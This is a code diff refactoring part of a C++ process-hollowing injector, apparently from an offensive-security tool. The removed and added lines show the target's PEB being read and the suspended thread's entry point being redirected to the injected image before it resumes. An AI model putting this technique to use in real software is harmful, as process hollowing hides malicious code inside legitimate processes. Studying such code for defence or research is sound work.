@@ -30,15 +30,8 @@ bool inject_create_process_hollow(const std::wstring& original_image,
         return false;
     }
 
-    unique_c_mem<PEB> process_peb;
-    if (!process_peb.allocate()) {
-        return false;
-    }
-
-    wprintf(L"  [*] reading process PEB at 0x%p...\n", BasicInfo.PebBaseAddress);
-
-    size_t read = sysapi::VirtualMemoryRead(process_peb.data(), sizeof(PEB), BasicInfo.PebBaseAddress, process.hProcess.get());
-    if (read == 0) {
+    auto process_peb = process_read_peb(process.hProcess.get());
+    if (process_peb.data() == NULL) {
         return false;
     }
 
@@ -136,58 +129,10 @@ bool inject_create_process_hollow(const std::wstring& original_image,
     wprintf(L"\nFixing thread\n");
 
     if (is_64) {
-
-        unique_c_mem<CONTEXT> context;
-        if (!context.allocate()) {
-            return false;
-        }
-
-        memset(context.data(), 0, sizeof(CONTEXT));
-
-        context->ContextFlags = CONTEXT_FULL;
-
-        wprintf(L"  [*] getting old thread context...\n");
-
-        res = sysapi::ThreadGetContext(process.hThread.get(), context.data());
-        if (!res) {
-            return false;
-        }
-
-        context->Rcx = (DWORD64)(UINT_PTR)PTR_ADD(process_peb->ImageBaseAddress, pNT64Header->OptionalHeader.AddressOfEntryPoint);
-
-        wprintf(L"  [*] setting new thread context with EP at 0x%p...\n", (PVOID)(UINT_PTR)context->Rcx);
-
-        res = sysapi::ThreadSetContext(process.hThread.get(), context.data());
-        if (!res) {
-            return false;
-        }
+        res = thread_set_execute<true, true>(process.hThread.get(), PTR_ADD(process_peb->ImageBaseAddress, pNT64Header->OptionalHeader.AddressOfEntryPoint));
     }
     else {
-
-        unique_c_mem<WOW64_CONTEXT> context;
-        if (!context.allocate()) {
-            return false;
-        }
-
-        memset(context.data(), 0, sizeof(WOW64_CONTEXT));
-
-        context->ContextFlags = CONTEXT_FULL;
-
-        wprintf(L"  [*] getting old thread context...\n");
-
-        res = sysapi::ThreadGetWow64Context(process.hThread.get(), context.data());
-        if (!res) {
-            return false;
-        }
-
-        context->Eax = (DWORD)(UINT_PTR)PTR_ADD(process_peb->ImageBaseAddress, pNT32Header->OptionalHeader.AddressOfEntryPoint);
-
-        wprintf(L"  [*] setting new thread context with EP at 0x%p...\n", (PVOID)(UINT_PTR)context->Eax);
-
-        res = sysapi::ThreadSetWow64Context(process.hThread.get(), context.data());
-        if (!res) {
-            return false;
-        }
+        res = thread_set_execute<true, false>(process.hThread.get(), PTR_ADD(process_peb->ImageBaseAddress, pNT32Header->OptionalHeader.AddressOfEntryPoint));
     }
 
     wprintf(L"  [*] resuming thread...\n");
